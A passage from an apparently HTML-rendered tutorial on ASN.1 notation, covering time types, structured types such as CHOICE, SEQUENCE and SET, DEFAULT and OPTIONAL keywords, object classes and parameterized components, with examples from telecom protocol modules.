<code>VisibleString</code>.</p><p><code>UTCTime</code> format is "YYMMDD" for date followed by "hhmm" or "hhmmss"
for time, ending with either "z", "-hhmm" or "+hhmm" for time offset.</p><p>Specifying "2021-12-14 04:32 CET" in <code>UTCTime</code></p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2112140332Z"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2112140432+0100"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><code>GeneralizedTime</code> gives a bit more flexibility with regards to the format.</p><p>It consists of a calendar date of format "YYYYMMDD", followed by
either "hh", "hhmm", "hhmmss" and optional parts ".<!-- -->[0-9]<!-- -->+", and
optionally ending with the coordinated universal time character "z" or
the time offset in hours/minutes "-hhmm" or "+hhmm".</p><p>These are the same, but one with higher precision and in local time.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2021121403.54Z" -- 3.54 hours after midnight</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">"20211214043227.981935+0100" -- 3 hours, 32 minutes, 27 seconds, 981935 microseconds</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><code>DATE</code>, <code>TIME-OF-DAY</code>, <code>DATE-TIME</code> and <code>DURATION</code> was introduced after
the third generation of ISO 8601 was released 2004.</p><p>They are defined as subsets of <code>TIME</code>.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DATE ::= [UNIVERSAL 31] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Date Date=YMD Year=Basic")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TIME-OF-DAY ::= [UNIVERSAL 32] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Time Time=HMS Local-or-UTC=L")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DATE-TIME ::= [UNIVERSAL 33] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Date-Time Date=YMD Year=Basic Time=HMS Local-or-UTC=L")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DURATION ::= [UNIVERSAL 34] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Interval Interval-type=D")</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>As I can find no real world examples from our ASN.1-files, I'm forced
to make-up examples of these</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">date1 DATE ::= "211214"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">time1 TIME-OF-DAY ::= "043227"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">date-time1 DATE-TIME ::= "211214043227"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration1 DURATION ::= "P0Y29M0DT0H0M0S" -- 29 months to an accuracy of 1 second</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Values of type <code>DURATION</code> starts with "P" followed by alot of
different optional parts and formats.  If the time designation is used
it should start with a "T" to keep months and minutes separate.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration2 DURATION ::= "P2MT2M" -- 2 months and 2 minutes</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration3 DURATION ::= "P29M0DT0.00M" -- 29 months with accuracy of one-hundredth of a minute</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration4 DURATION ::= "P32W" -- 32 weeks</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="structured-types">Structured types<a class="hash-link" href="#structured-types" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="choice">CHOICE<a class="hash-link" href="#choice" title="Direct link to heading">​</a></h3><p>The type <code>CHOICE</code> can take values from one of multiple types, <code>CHOICE</code>
doesn't have it's own universal tag.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID        [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests     [1] NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>The value of type <code>CancelArg</code> will either of an <code>InvokeID</code> type, or a
<code>NULL</code> type.  It will be tagged <code>[0]</code> or <code>[1]</code> respectively, that is
why <code>CHOICE</code> doesn't have it's own universal tag, as it is derived
from ASN.1 specification.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="sequence-of">SEQUENCE (OF)<a class="hash-link" href="#sequence-of" title="Direct link to heading">​</a></h3><p><code>SEQUENCE</code> and <code>SEQUENCE OF</code> are used for composing multiple types.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">EventTypeSMS ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sms-CollectedInfo                   (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    o-smsFailure                        (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    o-smsSubmission                     (3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sms-DeliveryRequested               (11),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    t-smsFailure                        (12),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    t-smsDelivery                       (13)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">MonitorMode ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    interrupted                         (0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    notifyAndContinue                   (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    transparent                         (2)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">SMSEvent ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    eventTypeSMS   [0] EventTypeSMS,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    monitorMode    [1] MonitorMode</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Tone ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    toneID         [0] Integer4,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    duration       [1] Integer4 OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>A value of the <code>SMSEvent</code> type have information on both <code>EventTypeSMS</code>
and <code>MonitorMode</code>. The fixed number of fields in the <code>SEQUENCE</code> type
are ordered.  Context-specific tagging (e.g. the <code>[0]</code>, <code>[1]</code>, <code>[2]</code>
stuff in the examples), is frequently applied for the structured
types, but one could also utilize the keywords <code>AUTOMATIC TAGGING</code> in
the module definition.</p><p><code>SEQUENCE OF</code> on the other hand, holds an arbitrary number of fields
of a single type.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">FilterItem ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    equality         [0] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    substrings       [1] SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        type    ATTRIBUTE.&amp;id({SupportedAttributes}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        strings SEQUENCE OF CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            initial [0] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            any     [1] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            final   [2] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    greaterOrEqual   [2] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    lessOrEqual      [3] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    present          [4] AttributeType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    approximateMatch [5] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    extensibleMatch  [6] MatchingRuleAssertion</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In the quite complex example above we see that the type <code>FilterItem</code>
is of type <code>CHOICE</code> and can take subtype called <code>strings</code>. <code>strings</code>
is of type <code>SEQUENCE OF CHOICE</code> which means it can take a list of
zero, one or more of <code>initial</code>, <code>any</code> or <code>final</code>. The example is quite
complex because it also uses multiple parameterized values. see
<a href="#automatic-implicit-explicit-tags">Automatic, Implicit, Explicit tags</a></p><p>We find another example in the DialoguePDUs module from
<a href="https://www.itu.int/rec/T-REC-Q.773-199706-I/en" target="_blank" rel="noopener noreferrer">Q.773</a> where the
AARQ is of type <code>SEQUENCE</code>, and the third field <code>user-information</code> is
an <code>SEQUENCE OF</code> <code>EXTERNAL</code> type.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  protocol-version</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  application-context-name  [1]  OBJECT IDENTIFIER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>They are quite different in how they are used, but they are encoded in
a similar way. Some languages represent <code>SEQUENCE</code> internally as a
<code>struct</code>, and <code>SEQUENCE OF</code> as an array, but encoded they would look
quite similar.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="set-of">SET (OF)<a class="hash-link" href="#set-of" title="Direct link to heading">​</a></h3><p><code>SET</code> and <code>SET OF</code> are similar to <code>SEQUENCE</code> and <code>SEQUENCE OF</code>
respectively. The difference is that the composite types are
unordered.</p><p>From <code>CAP-datatypes</code> we find an example of a <code>SET OF</code> with a
<a href="#parameterized-components">parameterized component</a> specifying a size
constraint.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Or an example of a value from the <code>TCAP-Tools</code> module in
<a href="https://www.itu.int/rec/T-REC-Q.775-199706-I/en" target="_blank" rel="noopener noreferrer">Q.775</a></p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancelFailed ERROR ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  PARAMETER</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    SET {problem   [0]  CancelProblem,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">         invokeId  [1]  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="selection">SELECTION<a class="hash-link" href="#selection" title="Direct link to heading">​</a></h3><p>The SELECTION type <code>&lt;</code> is used when one want's to obtain one of the
possible subtypes of a <code>CHOICE</code> definition.</p><p>If we expand the previous example from the <a href="#set-of">SET</a></p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancel OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ARGUMENT  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS    {cancelFailed}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancelFailed ERROR ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  PARAMETER</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    SET {problem   [0]  CancelProblem,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">         invokeId  [1]  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>we see that the <code>ARGUMENT</code> type and the invokeId field take the type
from the <code>present</code> field in the <code>TCInvokeIdSet</code> type.</p><p>the definition of <code>TCInvokeIdSet</code> is as follows</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeId ::= CHOICE {present  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                     absent   NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TCInvokeIdSet ::= InvokeId(WITH COMPONENTS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                             present  (-128..127)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                           })</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Thus <code>invokeId</code> and <code>ARGUMENT</code> fields will take integer values which
are between -128 and 127.</p><h1>Other concepts</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="default-and-optional-keywords">DEFAULT and OPTIONAL keywords<a class="hash-link" href="#default-and-optional-keywords" title="Direct link to heading">​</a></h2><p>One can use the <code>DEFAULT</code> keyword in order to specify the default value.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CollectedDigits ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  maximumNbOfDigits    [1] INTEGER (1..16),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceInformation     [9] BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceBack            [10] BOOLEAN DEFAULT FALSE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In this example we see the type <code>CollectedDigits</code> where most of the
values are either <code>DEFAULT</code> or <code>OPTIONAL</code>. The only value that needs
to be set is <code>maximumNbOfDigits</code>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="classes">Classes<a class="hash-link" href="#classes" title="Direct link to heading">​</a></h2><p>One can also use informal object classes in order to specify and
define values for general types.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">OPERATION ::= CLASS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ArgumentType          OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;argumentTypeOptional  BOOLEAN OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;returnResult          BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ResultType            OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;resultTypeOptional    BOOLEAN OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;Errors                ERROR OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;Linked                OPERATION OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;synchronous           BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;alwaysReturns         BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;InvokePriority        Priority OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ResultPriority        Priority OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;operationCode         Code UNIQUE OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">WITH SYNTAX {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ARGUMENT &amp;ArgumentType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   [OPTIONAL &amp;argumentTypeOptional]]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RESULT &amp;ResultType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   [OPTIONAL &amp;resultTypeOptional]]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RETURN RESULT &amp;returnResult]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ERRORS &amp;Errors]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [LINKED &amp;Linked]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [SYNCHRONOUS &amp;synchronous]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ALWAYS RESPONDS &amp;alwaysReturns]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [INVOKE PRIORITY &amp;InvokePriority]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RESULT-PRIORITY &amp;ResultPriority]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [CODE &amp;operationCode]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">provideRoutingInformation OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ARGUMENT  RequestArgument</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  RESULT    RoutingInformation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {invalidCalledNumber | subscriberNotReachable | calledBarred |</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      processingFailure}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  LINKED    {getCallingPartyAddress}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">getCallingPartyAddress OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  RESULT  CallingPartyAddress</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS  {callingPartyAddressNotAvailable | processingFailure}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">invalidCalledNumber ERROR ::= {CODE  local:1}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">subscriberNotReachable ERROR ::= {CODE  local:2}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">RequestArgument ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  calledNumber  IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  basicService  BasicServiceIndicator OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">RoutingInformation ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  reroutingNumber    [0] IMPLICIT IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  forwardedToNumber  [1] IMPLICIT IsdnNumber</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In the above <code>OPERATION</code> class, a syntax is defined for the
class. This class and syntax can then be used to define specific
values, for instance the <code>provideRoutingInformation</code> and
<code>getCallingPartyAddress</code> values.</p><p>We also glimse another class in the above example which I didn't
include. Can you find it?</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="parameterized-components">Parameterized components<a class="hash-link" href="#parameterized-components" title="Direct link to heading">​</a></h2><p>Another way to make the specs more generalized is to use parameterized
components. We've already seen a couple of examples of such, see the
chapter for the <a href="#null">NULL</a>, <a href="#external">EXTERNAL</a> and <a href="#set-of">SET
(OF)</a> types.</p><p>Let's look at the example from <code>SET OF</code> again.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bound.&amp;minGenericNumberLength .. bound.&amp;maxGenericNumberLength))</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><code>GenericNumbers</code> take a parameter <code>bound</code> of the type <code>PARAMETERS-BOUND</code> as input.</p><p><code>PARAMETERS-BOUND</code> is defined as a class with a lot of different
